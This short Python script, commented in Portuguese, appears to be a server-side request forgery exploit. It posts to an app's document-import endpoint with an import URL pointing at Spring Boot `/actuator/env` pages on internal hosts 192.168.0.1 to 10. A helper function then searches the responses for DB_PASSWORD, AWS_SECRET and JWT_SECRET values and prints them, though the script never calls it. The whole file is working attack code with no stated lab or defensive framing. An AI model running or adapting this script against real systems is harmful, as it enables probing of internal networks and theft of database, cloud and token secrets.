import requests
import json
import re

def loop_requests(url):
    # Insira a URL para o endpoint do seu app (ex: http://localhost:8080/api/documents/importar)
  
    for i in range(1, 11): # Loop de 10 solicitações
        payload = { "url_importacao": f"http://192.168.0.{i}:8080/actuator/env" }
        response = requests.post(url, json=payload)
  
        if response.status_code == 200:
            print("Request {} successful: {}".format(i, response.text)) # debug
        else:
            print("Request {} failed with status code: {}".format(i, response.status_code))
   

def parse_response(response):
    try:
        data = json.loads(response.text)  # Parse JSON resposta da requisição

        # Procura por expressões regulares para identificar credenciais, como DB_PASSWORD, AWS_SECRET ou JWT_SECRET
        for key in ['DB_PASSWORD', 'AWS_SECRET', 'JWT_SECRET']:  # Adicione mais keys se necessário 
            if key in data.keys() and re.search(f'{key}.*', str(data[key])):
                print(f'Secret found: {key} = {data[key]}') 
                return

    except json.JSONDecodeError:
        print("Response is not valid JSON.")

if __name__ == "__main__":
  loop_requests('http://localhost:8080/api/documents/importar')